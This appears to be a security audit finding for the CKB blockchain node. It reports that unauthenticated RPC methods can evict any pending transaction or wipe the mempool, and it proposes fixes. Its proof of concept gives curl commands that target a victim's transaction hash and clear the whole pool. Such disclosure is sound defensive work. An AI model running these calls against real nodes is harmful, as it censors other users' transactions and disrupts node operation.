### Title
Any RPC Caller Can Remove Any Pending Transaction from the Pool Without Ownership Validation — (`rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` RPC method in `rpc/src/module/pool.rs` performs a destructive operation on the shared transaction pool without validating that the caller is the original submitter of the targeted transaction. Because the CKB RPC server has no authentication mechanism whatsoever, any process with access to the RPC endpoint can silently evict any pending transaction submitted by any other user. The same absence of caller validation applies to `clear_tx_pool` and `clear_tx_verify_queue`, which wipe the entire pool and verification queue respectively.

---

### Finding Description

**Root cause — `remove_transaction` has no caller identity check.**

`PoolRpcImpl::remove_transaction` at `rpc/src/module/pool.rs:662–669` accepts a transaction hash and immediately forwards it to the pool for deletion:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

There is no check that the caller submitted the transaction, owns any of its inputs, or holds any credential. The same pattern holds for `clear_tx_pool` (lines 684–692) and `clear_tx_verify_queue` (lines 694–701).

**No authentication in the RPC server.**

The `Config` struct in `util/app-config/src/configs/rpc.rs` contains no authentication fields — no API token, no session key, no per-method ACL. The `ServiceBuilder` in `rpc/src/service_builder.rs` mounts all enabled modules without any authentication middleware. The only protection is the network-level binding address (`listen_address = "127.0.0.1:8114"` in `resource/ckb.toml:182`), which is a deployment convention, not an enforced code-level control.

**Two-step attack flow (direct analog to H-04):**

1. **TX1**: Victim calls `send_transaction` to submit a pending transaction to the pool.
2. **TX2**: Attacker calls `remove_transaction(victim_tx_hash)` — no ownership check is performed; the transaction is evicted.

The attacker needs only to know the transaction hash, which is public (returned by `send_transaction` and visible in `get_raw_tx_pool`).

---

### Impact Explanation

- **Targeted transaction censorship**: An attacker can evict any specific pending transaction before it is included in a block. For transactions with `since`-based time locks (absolute epoch or block-number constraints), eviction during the valid window causes the transaction to permanently miss its inclusion deadline, resulting in failed operations or locked funds.
- **Full mempool wipe**: `clear_tx_pool` removes every pending and proposed transaction simultaneously. A single unauthenticated RPC call can reset the entire node's mempool, disrupting all in-flight user transactions and degrading block assembly.
- **Verification queue disruption**: `clear_tx_verify_queue` drops all transactions currently being verified, silently discarding work without notifying submitters.

---

### Likelihood Explanation

- The RPC is bound to `127.0.0.1` by default, but many operators expose it to broader networks (a common misconfiguration explicitly warned against in the documentation). Any such node is directly reachable by an external attacker.
- Even on a correctly configured node, any local process — including malicious software co-resident on the machine — can reach the RPC without any credential.
- The RESEARCHER.md explicitly lists "Malicious API/RPC/web client submitting crafted inputs" as a valid attacker profile, and "supported local CLI/RPC user" is in scope.
- The transaction hash needed to target a specific victim transaction is publicly observable via `get_raw_tx_pool`.

---

### Recommendation

1. **Implement RPC authentication**: Add a bearer-token or HMAC-based authentication layer to the RPC server so that only authorized callers can invoke mutating methods. This is the minimal fix that closes the attack surface for all destructive pool operations.
2. **Restrict destructive methods by module**: Move `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` to a separate privileged module (e.g., `Debug` or a new `Admin` module) that is disabled by default and requires explicit opt-in, analogous to how the `Debug` module is already gated.
3. **Track submitter identity**: Optionally, record the source IP or a caller token at submission time and enforce that only the original submitter (or the node operator) can remove a specific transaction.

---

### Proof of Concept

**Preconditions**: Two RPC clients with access to the same node's `127.0.0.1:8114` endpoint (or any node with RPC exposed to a network).

**Steps**:

```bash
# Step 1 — Victim submits a transaction
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[<victim_tx_json>,"passthrough"]}'
# Returns: {"result": "0xVICTIM_TX_HASH"}

# Step 2 — Attacker observes the pool (no auth required)
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns all pending tx hashes including 0xVICTIM_TX_HASH

# Step 3 — Attacker removes the victim's transaction (no ownership check)
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"remove_transaction","params":["0xVICTIM_TX_HASH"]}'
# Returns: {"result": true}
# Victim's transaction is now gone from the pool with no error or notification.

# Step 3b — Alternatively, wipe the entire pool
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":4,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result": null}
```

**Expected outcome**: The victim's transaction is silently removed. If the transaction had a `since`-based deadline, it will miss its valid inclusion window.
